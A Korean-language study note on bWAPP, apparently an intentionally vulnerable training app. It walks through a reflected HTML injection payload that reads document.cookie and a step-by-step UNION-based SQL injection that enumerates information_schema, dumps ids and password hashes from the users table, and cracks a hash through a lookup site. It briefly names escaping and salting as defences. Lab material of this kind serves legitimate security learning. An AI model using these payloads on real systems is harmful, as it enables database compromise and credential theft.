## 1. HTML injection - Reflected(GET)

```jsx
//HTML injection - Reflected(GET)
//First name
<script>
//Last name
alert(document.cookie)</script>
```

이렇게 하면 세션값이 나오는데 해킹이 엄청 쉽다.

```tsx
:~$ cd /var/www/bWAPP
:~$ ls
:~$ vim sqli_1.php
```

하면 소스코드를 볼 수 있다.

## 2.SQL injection(GET/Search)

유저가 Search for a movie에 String을 준다.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/157771c2-7ada-4145-94be-b3349c6e7946/_2021-01-24__9.25.00.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/157771c2-7ada-4145-94be-b3349c6e7946/_2021-01-24__9.25.00.png)

sql에서는 if == where로 쓰인다. 약간 이런식으로 보통 쓰인다.

```sql
SELECT * FROM movies WHERE name = + ""
//이렇게 더하기로 이어 버리면 문제가 발생할 수 있다.
```

이건 왜 오류가 발생할까? 취약점을 알아보자.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/02b028d9-623b-4c55-9760-93e62bd236a2/_2021-01-24__9.26.38.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/02b028d9-623b-4c55-9760-93e62bd236a2/_2021-01-24__9.26.38.png)

```sql
WHERE name = 'a' + 'input' + 'b'
//이런식으로 '으로 이어져 짜였을 텐데, 결과적으로 a''b이런식으로 되니까 오류가 남.
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8f0d3a0b-e76b-45fa-8dc9-c1472d4f51b7/_2021-01-24__9.28.29.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8f0d3a0b-e76b-45fa-8dc9-c1472d4f51b7/_2021-01-24__9.28.29.png)

이렇게 완전히 정확하지 않은 단어를 쳤는데도, 값이 나왔다는 건 like문장을 썼다는 것임.

```sql
WHERE LIKE '%' +'유저 인풋'+'%'
```

요런식으로 되어 있다고 한다. 암튼 위에처럼 코드를 함 보자. 

해결하려면

```sql
SELECT * FROM movies WHERE title LIKE '%'#%'
// #을 이용하면 %만 검색(%는 아무 문자열을 쳐도 나오는 와일드 카드)
// 이렇게 하면 #앞에 코드를 넣어서 이용할 수 있다.
SELECT * FROM movies WHERE title LIKE '%' or 1=1 #%'
// 이러면 where 절 자체가 true가 되어 모든 검색결과를 가져 올 수 있다. 
// where 절 안에 union select를 사용 하면 앞에있는 테이블이랑 결과를 합쳐버린다.
SELECT * FROM movies WHERE title LIKE '%' union select 1,2,3,4,5,6,7 #%'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14172b9e-be48-4abc-a78e-f2f9953f52cd/_2021-01-24__9.53.14.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14172b9e-be48-4abc-a78e-f2f9953f52cd/_2021-01-24__9.53.14.png)

column 개수가 달라서 오류남. 1개로 입력했음. 1,2,3,4,5,6,7 하면 제대로 검색된다. 

movie table은 7개의 정보를 가지고 있다. 

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a84987e9-39c3-4d8f-b253-3d77339473dc/_2021-01-24__9.55.08.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a84987e9-39c3-4d8f-b253-3d77339473dc/_2021-01-24__9.55.08.png)

여기 보면 2, 3, 5, 4 이런식으로 title은 2번째 정보, release는 column의 3번째 정보 인것을 알 수 있다. 

그러면 2번째 column에 버전을 한번 출력을 해보자

```sql
SELECT * FROM movies WHERE title LIKE '%' union select 1,@@version,3,4,5,6,7 #%'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/69ba90d9-1f6a-4058-a505-eb9bc5eebd57/_2021-01-24__9.56.59.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/69ba90d9-1f6a-4058-a505-eb9bc5eebd57/_2021-01-24__9.56.59.png)

이번에는 데이터 베이스 안에 테이블의 정보를 담고 있는 테이블(informantion_schema.tables)을 이용해서 다른 테이블의 정보를 알아내보자.

```sql
SELECT * FROM movies WHERE title LIKE '%' union select 1,table_name,3,4,5,6,7 from information_schema.tables #%'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a89cbaca-93e0-470c-8cbb-5b9dd83461d0/_2021-01-24__10.04.28.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a89cbaca-93e0-470c-8cbb-5b9dd83461d0/_2021-01-24__10.04.28.png)

여기서 보면 해킹을 위해 users 테이블이 중요해 보인다. 그렇지만 user 테이블에 column이 뭐가 있는지 아직

모른다. movies 테이블은 안다. column이 Title, Relase, Character, Genre, IMDb 이런식으로 나와있는 걸 알 수 있다. 어떤 column 이 있는지 부터 한번 알아보자.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/377f3dc5-4b25-4125-80c6-a3d4f6bc4888/_2021-01-24__10.04.44.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/377f3dc5-4b25-4125-80c6-a3d4f6bc4888/_2021-01-24__10.04.44.png)

```sql
SELECT * FROM movies WHERE title LIKE '%' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'users' #%'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/adac94fb-42e3-4523-81e0-20f3c3b496af/_2021-01-24__10.09.15.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/adac94fb-42e3-4523-81e0-20f3c3b496af/_2021-01-24__10.09.15.png)

이러면 db 털렸다.. password를 털수 있게 된다.

```sql
SELECT * FROM movies WHERE title LIKE '%' union select 1,password,3,4,5,6,7 from users #%'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b06383f4-0927-4bdf-a956-b6c4a350ab09/_2021-01-24__10.10.53.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b06383f4-0927-4bdf-a956-b6c4a350ab09/_2021-01-24__10.10.53.png)

이거 해쉬값 처리는 되어 있긴 한데 원문을 알아 낼수 있을 거다 . 아주 쉽게

[Sha1 Decrypt & Encrypt - More than 15.000.000.000 hashes](https://md5decrypt.net/en/Sha1)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5d3a0fee-4d19-4a44-955b-c4b617c75639/_2021-01-24__10.41.37.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5d3a0fee-4d19-4a44-955b-c4b617c75639/_2021-01-24__10.41.37.png)

복호화 결과, 비밀번호는 'bug' . DB를 털어도 비밀번호가 안털리려면 어제 말한 salt 기법을 사용하는 것이 좋다.

추가로, 이거를 막기 위해 특수문자를 앞에 '\' 이스케이프 문자로 감싸주면 된다.

```sql
\'\#
이렇게 하면 아무 의미가 없는 작은 따옴표, #이 된다. 
```

아 뭔말인지 알았다. 

```sql
SELECT * FROM movies WHERE title LIKE '% {input} %'
//beWAPP에서 코드를 확인해보면 코드가 이런식으로 짜져 있는걸 알 수 있다.
//만약에 내가 DB의 비밀번호를 알아 내고자 한다 했을때, '을 검색창에 치면 오류가 뜬다. '%'%' 일때,
//'%'라는게 모든 문자열을 의미하고, %'때문에 syntax 오류가 나는 것이다. 
//그래서 내가 #으로%'을 무시하면, '%'로 모든 문자열이라고 간주한 후, ' 와 #사이에 내가 쿼리문을
//입력하면 그게 실행이 되는 것이다. 삽입되는 자리는 where 자리이다. 

SELECT * FROM movies WHERE title LIKE '%'union select #%'
//이렇게 union select를 했을 때, 다른 테이블과 결과를 합칠 수가 있다. 대신에, movies 테이블의
//column과 합칠 테이블의 column의 개수는 같아야 한다. 우선 무비테이블의 컬럼 개수를 모르니까, 
//한번 알아보는 거임. 

SELECT * FROM movies WHERE title LIKE '%'union select 1,2,3,4,5,6,7 #%'
//하니까 결과가 출력되었고,movies의 컬럼수는 7, 출력된 컬럼은 2,3,5,4번째로, 이걸 활용하면
//다른테이블의 데이터도 가져올 수 있다. 다른 테이블이 뭐가 있을까?
//mysql에서는 테이블의 정보를 담고 있는 테이블이 있다. information_schema.tables
//2번째 테이블에 하는거는 그냥 맨앞이라서 걍 한거다!. 3,5,4해도 상관 없다!

SELECT * FROM movies WHERE title LIKE '%' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'users' #%'
//이렇게 하면, 2번째 컬럼에 유저의 컬럼 정보를 주게 된다. 
//password라는 컬럼이 있고, 컬럼네임 부분을 password로 바꾸어 검색하면 된다. 
//password 컬럼과, id 컬럼을 함께 가져와 보자. 

SELECT * FROM movies WHERE title LIKE '%' union select 1,password,id,4,5,6,7 from users #%'
//이러면 아이디랑 비밀번호 알게 되고, salt 기법이 적용 안된거라 decrypt 사이트가서 하나 하면 쉽게 털게 된다. 
```
